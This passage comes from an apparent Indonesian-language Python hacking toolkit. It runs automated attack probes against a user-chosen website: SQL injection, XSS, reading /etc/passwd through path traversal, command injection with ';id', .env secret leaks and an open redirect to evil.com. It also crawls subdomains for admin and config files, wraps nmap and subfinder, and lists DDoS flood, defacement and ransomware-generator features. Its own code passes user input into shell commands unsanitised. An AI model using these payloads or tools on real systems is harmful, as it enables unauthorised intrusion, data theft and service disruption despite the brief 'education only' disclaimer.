        print(f"{GREEN}[CELAH] CORS leak{RESET}")
    else:
        print(f"{RED}[AMAN] CORS aman{RESET}")

    print(f"{CYAN}→ SSTI basic{RESET}")
    out = subprocess.getoutput(f'curl -s "{target}/?name={{7*7}}"')
    if "49" in out:
        print(f"{GREEN}[CELAH] SSTI deteksi{RESET}")
    else:
        print(f"{RED}[AMAN] SSTI aman{RESET}")

    print(f"{CYAN}→ Command injection{RESET}")
    out = subprocess.getoutput(f'curl -s "{target}/?ping=8.8.8.8;id"')
    if "uid=" in out:
        print(f"{GREEN}[CELAH] Command injection indikasi{RESET}")
    else:
        print(f"{RED}[AMAN] Command injection aman{RESET}")

    print(f"{CYAN}→ Dir brute admin{RESET}")
    out = subprocess.getoutput(f'curl -s -o /dev/null -w "%{{http_code}}" {target}/admin')
    if out.strip() == "200":
        print(f"{GREEN}[CELAH] /admin accessible{RESET}")
    else:
        print(f"{RED}[AMAN] /admin tidak ada / protect{RESET}")

    print(f"{CYAN}→ Dir brute dashboard{RESET}")
    out = subprocess.getoutput(f'curl -s -o /dev/null -w "%{{http_code}}" {target}/dashboard')
    if out.strip() == "200":
        print(f"{GREEN}[CELAH] /dashboard accessible{RESET}")
    else:
        print(f"{RED}[AMAN] /dashboard tidak ada / protect{RESET}")

    print(f"{CYAN}→ Dir brute upload{RESET}")
    out = subprocess.getoutput(f'curl -s -o /dev/null -w "%{{http_code}}" {target}/uploads')
    if out.strip() == "200":
        print(f"{GREEN}[CELAH] /uploads accessible{RESET}")
    else:
        print(f"{RED}[AMAN] /uploads tidak ada / protect{RESET}")

    print(f"{YELLOW}=== SCAN SELESAI ==={RESET}")
    input(f"\n{YELLOW}Scan selesai. Tekan Enter untuk kembali ke menu...{RESET}")

def cek_target_online(target):
    import subprocess
    import re
    try:
        status = subprocess.check_output(f"curl -Is {target} | head -n1", shell=True, universal_newlines=True)
        return bool(re.search(r'200|301|302', status))
    except:
        return False

def get_curl_methods(target):
    return [
        {
            "desc": "Header fingerprint",
            "cmd": f"curl -Is {target}",
            "pattern": r"Server|X-Powered-By"
        },
        {
            "desc": "SQLi (quote error)",
            "cmd": f'curl -s "{target}/?id=1\'"',
            "pattern": r"sql|syntax|odbc|mysql|warning"
        },
        {
            "desc": "SQLi (OR 1=1)",
            "cmd": f'curl -s "{target}/?id=1 or 1=1"',
            "pattern": r".*"
        },
        {
            "desc": "XSS basic",
            "cmd": f'curl -s "{target}/?q=<script>alert(1)</script>"',
            "pattern": r"<script>alert1</script>"
        },
        {
            "desc": "LFI",
            "cmd": f'curl -s "{target}/?file=../../../../etc/passwd"',
            "pattern": r"root:.*:0"
        },
        {
            "desc": "robots.txt leak",
            "cmd": f"curl -s {target}/robots.txt",
            "pattern": r"Disallow|Allow"
        },
        {
            "desc": "Dir listing /uploads",
            "cmd": f'curl -s "{target}/uploads/"',
            "pattern": r"Index of|Parent Directory"
        },
        {
            "desc": "OPTIONS method",
            "cmd": f"curl -s -X OPTIONS {target}",
            "pattern": r"Allow:"
        },
        {
            "desc": "Hidden .env file",
            "cmd": f'curl -s {target}/.env',
            "pattern": r"APP_KEY|DB_PASSWORD"
        },
        {
            "desc": "Common admin dir",
            "cmd": f'curl -s -o /dev/null -w "%{{http_code}}" {target}/admin',
            "pattern": r"200"
        },
        {
            "desc": "Open redirect",
            "cmd": f'curl -s -L "{target}/?redirect=https://evil.com"',
            "pattern": r"evil.com"
        }
        # 👉 Lo tinggal tambah metode baru di sini
    ]

def exec_curl_method(method):
    import subprocess
    import re
    try:
        output = subprocess.check_output(method['cmd'], shell=True, universal_newlines=True, stderr=subprocess.STDOUT)
        return bool(re.search(method['pattern'], output, re.I))
    except:
        return False

def print_status(desc, status):
    LIME = '\033[92m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

    if status:
        print(f"{LIME}[✓] Celah: {desc}{RESET}")
    else:
        print(f"{RED}[X] Tidak: {desc}{RESET}")

def save_report(celah_list, target):
    safe_target = target.replace("http://", "").replace("https://", "").replace("/", "_")
    filename = f"hasil-{safe_target}.txt"
    with open(filename, "w") as f:
        for c in celah_list:
            f.write(f"{c}\n")
    print(f"\033[93m[i] Laporan disimpan di: {filename}\033[0m")

def handle_command(cmd):
    cmd = cmd.strip().lower()

    mapping = {
        '0': sys.exit,
        'exit': sys.exit,
        '1': draw_help_table,
        'help': draw_help_table,
        '2': fitur_2,
        'webinfo': fitur_2,
        '3': fitur_3,
        'wordlist': fitur_3,
        '4': fitur_4,
        'lamp': fitur_4,
        '5': fitur_5,
        'phone': fitur_5,
        '6': fitur_6,
        'findfile': fitur_6,
        '7': fitur_7,
        'sqlscanner': fitur_7,
        '8': fitur_8_base64,
        'b64tool': fitur_8_base64,
        '9': fitur_9,
        'ddos': fitur_9,
        '10': feature_10_lamp_control,
        'lampctl': feature_10_lamp_control,
        '11': fitur_11_nmap_scan,
        'nmapscan': fitur_11_nmap_scan,
        '12': fitur_12_subfinder_main,
        'subfinder': fitur_12_subfinder_main,
        '13': fitur_13_whois,
        'whois': fitur_13_whois,
        '14': fitur_14,
        'sqli': fitur_14,
        '15': fitur_15_sitehunter,
        'sitehunter': fitur_15_sitehunter,
        '16': settings,
        'settings': settings,
        '17': fitur_17_deface,
        'deface': fitur_17_deface,
        '18': fitur_18_ransom_generator,
        'ransomware': fitur_18_ransom_generator,
        '19': fitur_19_qr_generator,
        'qrgenerate': fitur_19_qr_generator,
        '20': fitur_20_scan_wifi,
        'scanwifi': fitur_20_scan_wifi,
        '21': fitur_21_adminfinder,
        'findWlogin': fitur_21_adminfinder,

    }

    if cmd in mapping:
        ...

    if cmd in mapping:
        if cmd in ['0', 'exit']:
            clear()
            print(f"{GREEN}Keluar dari program...{RESET}")
            time.sleep(1)
            mapping[cmd]()  # sys.exit()
        else:
            mapping[cmd]()
    else:
        print(f"{RED}Perintah tidak dikenali: {cmd}{RESET}")
        time.sleep(2)

def fitur_15_sitehunter():
    import os
    import subprocess
    import requests
    import threading
    from bs4 import BeautifulSoup
    from urllib.parse import urljoin

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

    os.system("clear" if os.name != "nt" else "cls")

    headers = {"User-Agent": "Mozilla/5.0 (compatible; sitehunter/1.0)"}

    def check_online(domain):
        urls = [f"http://{domain}", f"https://{domain}"]
        for url in urls:
            try:
                r = requests.get(url, headers=headers, timeout=5)
                if r.status_code in [200, 301, 302]:
                    return url
            except:
                continue
        return None

    def crawl_subdomain(sub, hasil_dir, scheme):
        sub_dir = os.path.join(hasil_dir, sub.replace(":", "_"))
        os.makedirs(sub_dir, exist_ok=True)
        url = f"{scheme}://{sub}"

        try:
            r = requests.get(url, headers=headers, timeout=5)
            with open(os.path.join(sub_dir, "index.html"), "w", encoding="utf-8") as f:
                f.write(r.text)

            soup = BeautifulSoup(r.text, "html.parser")
            links = [urljoin(url, tag.get('href')) for tag in soup.find_all('a', href=True)]
            links += [urljoin(url, tag.get('src')) for tag in soup.find_all(src=True)]
            links = list(set(links))

            for link in links:
                try:
                    res = requests.get(link, headers=headers, timeout=5)
                    if res.status_code == 200:
                        fname = link.split("/")[-1] or "index"
                        fname = fname.split("?")[0]
                        with open(os.path.join(sub_dir, fname), "wb") as f:
                            f.write(res.content)
                        print(f"{GREEN}[✓] {link}{RESET}")
                except:
                    print(f"{YELLOW}[!] Gagal download: {link}{RESET}")

            paths = ["admin", "login", "backup", "config.php", "robots.txt"]
            for p in paths:
                p_url = f"{url}/{p}"
                try:
                    res = requests.get(p_url, headers=headers, timeout=5)
                    if res.status_code == 200:
                        fname = p.replace("/", "_")
                        with open(os.path.join(sub_dir, fname), "wb") as f:
                            f.write(res.content)
                        print(f"{GREEN}[✓] Path ditemukan: {p_url}{RESET}")
                except:
                    continue

        except:
            print(f"{RED}[X] Gagal akses: {sub}{RESET}")

    # === MULAI ===
    target = input(f"{YELLOW}Masukkan domain target (contoh: example.com): {RESET}").strip().lower()
    if not target:
        print(f"{RED}[X] Domain tidak boleh kosong! Kembali ke menu...{RESET}")
        return

    print(f"{CYAN}[i] Cek apakah target online (http/https)...{RESET}")
    target_url = check_online(target)
    if not target_url:
        print(f"{RED}[X] Target tidak online (http/https gagal). Kembali ke menu...{RESET}")
        return
    scheme = target_url.split(":")[0]
    print(f"{GREEN}[✓] Target online: {target_url}{RESET}")

    hasil_dir = f"hasil_{target.replace('.', '_')}"
    os.makedirs(hasil_dir, exist_ok=True)

    print(f"{CYAN}[i] Menjalankan subfinder...{RESET}")
    try:
        sub_out = subprocess.getoutput(f"subfinder -d {target} -silent")
        subs = list(set(sub_out.splitlines()))
    except Exception as e:
        print(f"{RED}[X] Gagal subfinder: {e}. Kembali ke menu...{RESET}")
        return

    if not subs:
        print(f"{RED}[X] Tidak ada subdomain ditemukan. Kembali ke menu...{RESET}")
        return

    with open(os.path.join(hasil_dir, "subdomain_list.txt"), "w") as f:
        for s in subs:
            f.write(s + "\n")

    print(f"{GREEN}[✓] Ditemukan {len(subs)} subdomain. Memulai crawling...{RESET}")

    threads = []
    for sub in subs:
        t = threading.Thread(target=crawl_subdomain, args=(sub, hasil_dir, scheme))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f"{GREEN}[✓] Semua selesai. Hasil di folder: {hasil_dir}{RESET}")

def fitur_13_whois():
    import subprocess
    import re
    import os
    import time

    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    LIME = '\033[92m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

    os.system('clear')
    print(f"{CYAN}{BOLD}=== WHOIS LOOKUP - FITUR 13 ==={RESET}\n")

    target = input(f"{YELLOW}Masukkan domain atau IP target: {RESET}").strip()
    if not target:
        print(f"{RED}Target tidak boleh kosong!{RESET}")
        time.sleep(2)
        return

    print(f"\n{CYAN}Menjalankan WHOIS untuk: {GREEN}{target}{RESET}")
    time.sleep(1)

    try:
        result = subprocess.check_output(f"whois {target}", shell=True, universal_newlines=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        print(f"{RED}Gagal mengambil data WHOIS: {e.output}{RESET}")
        return

    # Parsing info penting
    info = {
        "Domain Name": "",
        "Registrar": "",
        "Creation Date": "",
        "Updated Date": "",
        "Registry Expiry Date": "",
        "Name Servers": [],
        "Status": [],
        "Registrant": "",
        "Organization": "",
        "Country": "",
        "Email": ""
    }

    for line in result.splitlines():
        line = line.strip()
        if re.match(r'^Domain Name:', line, re.I):
            info["Domain Name"] = line.split(":", 1)[1].strip()
        elif re.match(r'^Registrar:', line, re.I):
            info["Registrar"] = line.split(":", 1)[1].strip()
        elif re.match(r'^Creation Date:', line, re.I):
            info["Creation Date"] = line.split(":", 1)[1].strip()
        elif re.match(r'^Updated Date:', line, re.I):
            info["Updated Date"] = line.split(":", 1)[1].strip()
        elif re.match(r'^(Registry )?Expiry Date:', line, re.I):
            info["Registry Expiry Date"] = line.split(":", 1)[1].strip()
        elif re.match(r'^(Name Server|Nameserver):', line, re.I):
            ns = line.split(":", 1)[1].strip()
            if ns not in info["Name Servers"]:
                info["Name Servers"].append(ns)
        elif re.match(r'^(Domain )?Status:', line, re.I):
            status = line.split(":", 1)[1].strip()
            if status not in info["Status"]:
                info["Status"].append(status)
        elif re.match(r'^(Registrant Name|Name):', line, re.I):
            if not info["Registrant"]:
                info["Registrant"] = line.split(":", 1)[1].strip()
        elif re.match(r'^(Registrant Organization|Organization):', line, re.I):
            if not info["Organization"]:
                info["Organization"] = line.split(":", 1)[1].strip()
        elif re.match(r'^(Registrant Country|Country):', line, re.I):
            if not info["Country"]:
                info["Country"] = line.split(":", 1)[1].strip()
        elif re.search(r'@', line) and 'Email' in line:
            info["Email"] = line.split(":", 1)[1].strip()

    # Tampilkan hasil keren
    print(f"\n{CYAN}{'═'*60}{RESET}")
    print(f"{BLUE}{' WHOIS Rangkuman ':^60}{RESET}")
    print(f"{CYAN}{'═'*60}{RESET}")

    def print_line(label, value):
        if value:
            print(f"{CYAN}• {YELLOW}{label:<20}{CYAN}: {GREEN}{value}{RESET}")

    print_line("Domain", info["Domain Name"])
    print_line("Registrar", info["Registrar"])
    print_line("Created", info["Creation Date"])
    print_line("Updated", info["Updated Date"])
    print_line("Expiry", info["Registry Expiry Date"])

    if info["Name Servers"]:
        print(f"{CYAN}• {YELLOW}Name Servers{CYAN}:")
        for ns in info["Name Servers"]:
            print(f"  {LIME}- {ns}{RESET}")

    if info["Status"]:
        print(f"{CYAN}• {YELLOW}Status{CYAN}:")
        for st in info["Status"]:
            print(f"  {BLUE}- {st}{RESET}")

    print_line("Registrant", info["Registrant"])
    print_line("Org", info["Organization"])
    print_line("Country", info["Country"])
    print_line("Email", info["Email"])

    print(f"{CYAN}{'═'*60}{RESET}")
    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

def fitur_12_subfinder_main():
    import os
    import time

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

    os.system('clear')
    print(f"{CYAN}{BOLD}=== SUBFINDER SUITE - FITUR 12 ==={RESET}\n")

    domain = input(f"{YELLOW}Masukkan domain target: {RESET}").strip()
    if not domain:
        print(f"{RED}Domain tidak boleh kosong!{RESET}")
        time.sleep(2)
        return

    print(f"\n{CYAN}Pilih mode scan:{RESET}")
    print(f"{GREEN}1.{RESET} Passive (default, semua source)")
    print(f"{GREEN}2.{RESET} Silent output")
    print(f"{GREEN}3.{RESET} Output ke file TXT")
    print(f"{GREEN}4.{RESET} Output ke file JSON")
    print(f"{GREEN}5.{RESET} Pilih source manual")
    print(f"{GREEN}6.{RESET} Recursive scan")
    print(f"{GREEN}7.{RESET} Setup API key")
    print(f"{GREEN}8.{RESET} List semua source")
    print(f"{GREEN}9.{RESET} Gabungan mode (recursive + silent + file)")
    print(f"{GREEN}0.{RESET} Batal / Kembali")

    pilihan = input(f"\n{CYAN}Pilih mode (angka): {RESET}").strip()

    if pilihan == '0':
        print(f"{YELLOW}Dibatalkan.{RESET}")
        time.sleep(1)
        return
    else:
        fitur_12_handle_mode(domain, pilihan)

def fitur_12_run_subfinder(domain, opsi_list):
    import subprocess
    import os
    import threading
    import time

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

    def loading_anim(stop_event):
        anim = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        i = 0
        while not stop_event.is_set():
            print(f"{YELLOW}Running Subfinder {anim[i % len(anim)]}{RESET}", end='\r')
            i += 1
            time.sleep(0.1)

    os.system('clear')
    cmd = f"subfinder -d {domain} {' '.join(opsi_list)}"
    print(f"{CYAN}Menjalankan perintah: {GREEN}{cmd}{RESET}\n")

    stop_event = threading.Event()
    t = threading.Thread(target=loading_anim, args=(stop_event,))
    t.start()

    try:
        result = subprocess.check_output(cmd, shell=True, universal_newlines=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output

    stop_event.set()
    t.join()

    os.system('clear')
    lines = [line for line in result.splitlines() if line.strip() != '']

    if not lines:
        print(f"{RED}Tidak ada subdomain ditemukan atau terjadi error.{RESET}")
    else:
        for line in lines:
            color = (
                GREEN if '.' in line else
                CYAN if 'Subfinder' in line or 'Enumerating' in line else
                YELLOW
            )
            print(f"{color}{line}{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

def fitur_12_select_sources(domain):
    import os
    import time

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

    os.system('clear')
    print(f"{CYAN}=== PILIH SOURCE SUBFINDER ==={RESET}\n")
    print(f"{YELLOW}Contoh source: crtsh,virustotal,shodan,censys,threatcrowd,dnsdb,dnsdumpster,dnsrepo,wayback,archiveis,rapiddns,anubis,zoomeye,securitytrails,robtex{RESET}")
    print(f"{CYAN}Ketik nama source, pisahkan dengan koma tanpa spasi{RESET}")
    sources = input(f"{YELLOW}Masukkan sources: {RESET}").strip()

    if not sources:
        print(f"{RED}Source tidak boleh kosong!{RESET}")
        time.sleep(2)
        return

    opsi_list = [f"-sources {sources}"]
    fitur_12_run_subfinder(domain, opsi_list)

def fitur_12_set_api():
    import os
    import time

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

    os.system('clear')
    print(f"{CYAN}=== SETUP API KEY SUBFINDER ==={RESET}\n")
    print(f"{YELLOW}Masukkan API key untuk source yang mau kamu atur.{RESET}")
    print(f"{YELLOW}Contoh source: virustotal, shodan, censys{RESET}")

    source = input(f"{CYAN}Masukkan nama source: {RESET}").strip()
    if not source:
        print(f"{RED}Source tidak boleh kosong!{RESET}")
        time.sleep(2)
        return

    apikey = input(f"{CYAN}Masukkan API key untuk {source}: {RESET}").strip()
    if not apikey:
        print(f"{RED}API key tidak boleh kosong!{RESET}")
        time.sleep(2)
        return

    config_dir = os.path.expanduser("~/.config/subfinder")
    config_file = os.path.join(config_dir, "provider-config.yaml")

    if not os.path.exists(config_dir):
        os.makedirs(config_dir)

    # Tambah/replace entry
    try:
        # Kalau file sudah ada, baca
        lines = []
        if os.path.exists(config_file):
            with open(config_file, "r") as f:
                lines = f.readlines()

        found = False
        with open(config_file, "w") as f:
            for line in lines:
                if line.strip().startswith(f"{source}:"):
                    found = True
                    f.write(f"{source}:\n  - {apikey}\n")
                elif not line.strip().startswith("-") and not line.strip().startswith(f"{source}:"):
                    f.write(line)
            if not found:
                f.write(f"{source}:\n  - {apikey}\n")

        print(f"{GREEN}API key untuk {source} sudah disimpan di {config_file}{RESET}")
    except Exception as e:
        print(f"{RED}Gagal menyimpan API key: {e}{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")



def fitur_12_handle_mode(domain, pilihan):
    import time
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

    opsi_list = []

    if pilihan == '1':
        # Passive default, no extra option
        opsi_list = []
    elif pilihan == '2':
        opsi_list = ['-silent']
    elif pilihan == '3':
        opsi_list = ['-o hasil_subfinder.txt']
    elif pilihan == '4':
        opsi_list = ['-o hasil_subfinder.json', '-oJ']
    elif pilihan == '5':
        fitur_12_select_sources(domain)  # Kita bikin ini nanti
        return
    elif pilihan == '6':
        opsi_list = ['-recursive']
    elif pilihan == '7':
        fitur_12_set_api()  # Kita bikin ini nanti
        return
    elif pilihan == '8':
        fitur_12_list_sources()  # Kita bikin ini nanti
        return
    elif pilihan == '9':
        opsi_list = ['-recursive', '-silent', '-o hasil_subfinder.txt']
    else:
        print(f"{RED}Pilihan tidak valid!{RESET}")
        time.sleep(2)
        return

    fitur_12_run_subfinder(domain, opsi_list)  # Kita bikin runner ini berikutnya

def draw_help_table():
    warning = f"""
{RED}╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║  {YELLOW}⚠ WARNING ⚠{RESET}{RED}                                                               ║
║                                                                            ║
║  {WHITE}Tool ini dibuat untuk keperluan edukasi & pembelajaran.{RESET}{RED}                   ║
║  Segala penyalahgunaan di luar tanggung jawab author.{RESET}{RED}                      ║
║                                                                            ║
║  {CYAN}Author : Raffael{RESET}{RED}                                                          ║
║  {CYAN}GitHub : @TheRealRafael00{RESET}{RED}                                                 ║
║  {CYAN}TikTok : @if.no.username{RESET}{RED}                                                  ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝{RESET}
"""

    header = f"""
{CYAN}╔════════════════════════════════════════════════════════════════════════════╗
║                          {YELLOW}HELP MENU - VVIP TOOL{CYAN}                             ║
╚════════════════════════════════════════════════════════════════════════════╝{RESET}
"""

    features = f"""
{YELLOW}0. exit{RESET}        : {GREEN}Keluar program dengan aman{RESET}
{YELLOW}1. help{RESET}        : {GREEN}Menampilkan menu bantuan ini dengan detail fitur{RESET}
{YELLOW}2. webinfo{RESET}     : {GREEN}Ambil info IP, header, server website target{RESET}
{YELLOW}3. wordlist{RESET}    : {GREEN}Generator wordlist brute force sederhana{RESET}
{YELLOW}4. lamp{RESET}        : {GREEN}Kontrol LED perangkat (jika mendukung){RESET}
{YELLOW}5. phone{RESET}       : {GREEN}Lookup info no HP: negara, provider, format{RESET}
{YELLOW}6. findfile{RESET}    : {GREEN}Cari file di Termux bila lupa path-nya{RESET}
{YELLOW}7. sqlscanner{RESET}  : {GREEN}SQL injection scan otomatis, pengguna harus install sqlmap di path yang                 sama dengan script!{RESET}
{YELLOW}8. b64tool{RESET}     : {GREEN}Base64 encode/decode file berkali-kali{RESET}
{YELLOW}9. ddos{RESET}        : {GREEN}HTTP flood (DDoS L7) dengan proxy random{RESET}
{YELLOW}10. lampctl{RESET}    : {GREEN}Kontrol smart lamp (nyala, warna, terang){RESET}
{YELLOW}11. nmapscan{RESET}   : {GREEN}Nmap scan port, service, fingerprint secara lengkap{RESET}
{YELLOW}12. subfinder{RESET}  : {GREEN}Cari subdomain aktif dari domain target{RESET}
{YELLOW}13. whois{RESET}      : {GREEN}WHOIS lookup domain/IP: pengguna hanya perlu memasuki google.com atau                   alamat ip 192.168 untuk cek info (hanya contoh){RESET}
{YELLOW}14. sqli{RESET}       : {GREEN}Cek SQLi pakai curl + payload dengan banyak perintah otomatisasi{RESET}
"""

    footer = f"""
{CYAN}╔════════════════════════════════════════════════════════════════════════════╗
║ {BLUE}Gunakan angka fitur untuk menjalankan. Contoh: ketik {GREEN}2{BLUE} untuk webinfo.{CYAN}      ║
╚════════════════════════════════════════════════════════════════════════════╝{RESET}
"""

    print(warning)
    print(header)
    print(features)
    print(footer)
    input(f"\n{YELLOW}Tekan ENTER untuk kembali ke menu...{RESET}")

def fitur_11_nmap_scan():
    import subprocess
    import os
    import time
    import threading

    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

    def clear_screen():
        os.system('clear')

    def loading_anim(stop_event):
        anim = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        i = 0
        while not stop_event.is_set():
            print(f"{YELLOW}Scanning {anim[i % len(anim)]}{RESET}", end='\r')
            i += 1
            time.sleep(0.1)

    scan_modes = [
        {"no": 1, "desc": "Basic Scan", "cmd": "nmap {target}"},
        {"no": 2, "desc": "SYN Scan (Stealth)", "cmd": "nmap -sS {target}"},
        {"no": 3, "desc": "UDP Scan", "cmd": "nmap -sU {target}"},
        {"no": 4, "desc": "Port 80 & 443 Only", "cmd": "nmap -p 80,443 {target}"},
        {"no": 5, "desc": "Full Service + OS Detection", "cmd": "nmap -A {target}"},
        {"no": 6, "desc": "OS Detection Only", "cmd": "nmap -O {target}"},
        {"no": 7, "desc": "Version Detection", "cmd": "nmap -sV {target}"},
        {"no": 8, "desc": "Vulnerability Scan", "cmd": "nmap --script vuln {target}"},
        {"no": 9, "desc": "No Ping Scan", "cmd": "nmap -Pn {target}"},
        {"no": 10, "desc": "Full Speed Scan", "cmd": "nmap -T4 {target}"},
    ]

    clear_screen()
    print(f"{CYAN}{BOLD}NMAP SCAN FULL FITUR{RESET}\n")
    for mode in scan_modes:
        print(f"{GREEN}{mode['no']}. {YELLOW}{mode['desc']}{RESET}")

    try:
        pilihan = int(input(f"\n{CYAN}Pilih mode scan (angka): {RESET}"))
        mode = next((m for m in scan_modes if m["no"] == pilihan), None)
        if not mode:
            print(f"{RED}Pilihan tidak valid!{RESET}")
            time.sleep(2)
            return
    except:
        print(f"{RED}Input harus angka!{RESET}")
        time.sleep(2)
        return

    target = input(f"{YELLOW}Masukkan IP / Domain target: {RESET}").strip()
    if not target:
        print(f"{RED}Target tidak boleh kosong!{RESET}")
        time.sleep(2)
        return

    cmd = mode["cmd"].format(target=target)

    clear_screen()
    print(f"{CYAN}Menjalankan: {GREEN}{cmd}{RESET}\n")

    stop_event = threading.Event()
    t = threading.Thread(target=loading_anim, args=(stop_event,))
    t.start()

    try:
        result = subprocess.check_output(cmd, shell=True, universal_newlines=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output

    stop_event.set()
    t.join()
    clear_screen()

    lines = [line for line in result.splitlines() if line.strip() != '']

    if not lines:
        print(f"{RED}Tidak ada output yang dihasilkan. Periksa target atau perintahnya!{RESET}")
        input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")
        return

    # Tampilkan hasil dengan warna dinamis
    for line in lines:
        color = (
            GREEN if 'open' in line else
            YELLOW if 'filtered' in line or 'closed' in line else
            CYAN if 'Nmap' in line or 'scan report' in line else
            RESET
        )
        print(f"{color}{line}{RESET}")

    input(f"\n{YELLOW}Tekan Enter untuk kembali...{RESET}")

def feature_10_lamp_control():
    import socket, json, time, os

    LIME = "\033[92m"
    RED = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

    lamp_map = {
        "master": "192.168.18.7",
        "second": "192.168.18.6",
        "living": "192.168.18.8",
        "living2": "192.168.18.5",
        "outdoor": "192.168.18.11"
    }

    color_map = {
        "Cool White (cool)": 6500,
        "Daylight (neutral)": 4000,
        "Warm White (yellow)": 2700
    }

    def clear(): os.system('cls' if os.name == 'nt' else 'clear')

    def send_wiz_command(ip, payload):
        msg = json.dumps(payload).encode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(msg, (ip, 38899))
            data, _ = sock.recvfrom(1024)
            print(f"{LIME}Response:{RESET} {data.decode()}")
        except socket.timeout:
            print(f"{RED}Failed: no response. Make sure you're on the same Wi-Fi.{RESET}")
        except Exception as e:
            print(f"{RED}Error:{RESET} {e}")
        finally:
            sock.close()

    def control(ip, state=None, brightness=None, temp=None):
        params = {}
        if state is not None: params["state"] = state
        if brightness is not None: params["dimming"] = brightness
        if temp is not None: params["temp"] = temp

        payload = {"method": "setPilot", "params": params}
        send_wiz_command(ip, payload)

    while True:
        clear()
        print(f"{LIME}{BOLD}Smart Wi-Fi Lamp Control{RESET}")
        print(f"{LIME}Choose a lamp to control:{RESET}")
        for i, (name, ip) in enumerate(lamp_map.items(), 1):
            print(f"{LIME}{i}. {name} ({ip}){RESET}")
        print(f"{LIME}0. Return to main menu{RESET}")

        try:
            lamp_choice = int(input(f"{LIME}Enter number: {RESET}"))
            if lamp_choice == 0:
                break
            lamp_name = list(lamp_map.keys())[lamp_choice - 1]
            lamp_ip = lamp_map[lamp_name]
        except:
            print(f"{RED}Invalid input.{RESET}")
            time.sleep(2)
            continue

        while True:
            clear()
            print(f"{LIME}Lamp: {lamp_name} ({lamp_ip}){RESET}\n")
            print(f"{LIME}1. Turn ON")
            print(f"2. Turn OFF")
            print(f"3. Set Brightness (1–100)")
            print(f"4. Set Color Temperature")
            print(f"0. Back{RESET}")

            try:
                action = int(input(f"{LIME}Select option: {RESET}"))
                if action == 0:
                    break
                elif action == 1:
                    control(lamp_ip, state=True)
                elif action == 2:
                    control(lamp_ip, state=False)
                elif action == 3:
                    level = int(input(f"{LIME}Brightness (1–100): {RESET}"))
                    control(lamp_ip, brightness=level)
                elif action == 4:
                    print(f"{LIME}Available color temperatures:{RESET}")
                    for i, (label, value) in enumerate(color_map.items(), 1):
                        print(f"{LIME}{i}. {label} ({value}K){RESET}")
                    temp_choice = int(input(f"{LIME}Choose one: {RESET}"))
                    temp_value = list(color_map.values())[temp_choice - 1]
                    control(lamp_ip, temp=temp_value)
                else:
                    print(f"{RED}Invalid option.{RESET}")
            except:
                print(f"{RED}Wrong input.{RESET}")
            input(f"\n{LIME}Press Enter to continue...{RESET}")

def fitur_8_base64():
    import base64
    clear()
    print(f"{CYAN}Base64 Smart Tool - 100x Encode/Decode + Format-aware{RESET}")
    print(f"{YELLOW}[!] Tool ini akan mengenkripsi atau mendekripsi file sebanyak 100x loop.{RESET}")
    
    mode = input(f"\n{BLUE}Pilih mode (encrypt/decrypt): {RESET}").strip().lower()
    if mode not in ['encrypt', 'decrypt']:
        print(f"{RED}Mode tidak valid! Harus 'encrypt' atau 'decrypt'.{RESET}")
        time.sleep(2)
        return

    path = input(f"{YELLOW}Masukkan path folder file (contoh: /storage/emulated/0): {RESET}").strip()
    filename = input(f"{YELLOW}Masukkan nama file (contoh: script.py): {RESET}").strip()

    full_path = os.path.join(path, filename)
    if not os.path.exists(full_path):
        print(f"{RED}File tidak ditemukan di lokasi tersebut!{RESET}")
        time.sleep(2)
        return

    try:
        with open(full_path, "rb") as f:
            data = f.read()

        status = ""
        for i in range(100):
            if mode == "encrypt":
                data = base64.b64encode(data)
            else:
                data = base64.b64decode(data)

        ext = os.path.splitext(filename)[1].lower()
        is_code = ext in ['.py', '.js', '.java', '.cpp', '.html', '.sh', '.php']

        if mode == "encrypt":
            with open(full_path, "wb") as f:
                f.write(data)

            if is_code:
                bahasa = ext.replace(".", "")
                extra = {
                    "py": b"import base64\n\n",
                    "js": b"const atob = require('atob'); const btoa = require('btoa');\n\n",
                    "php": b"<?php // base64 support\n\n",
                    "sh": b"# Base64 encryption\n\n",
                    "html": b"<!-- Base64 Encoded -->\n",
                    "cpp": b"// Base64 Encoded\n",
                    "java": b"// Base64 Encoded\n",
                }
                pre_code = extra.get(bahasa, b"")
                with open(full_path, "rb") as f:
                    new_data = pre_code + f.read()
                with open(full_path, "wb") as f:
                    f.write(new_data)

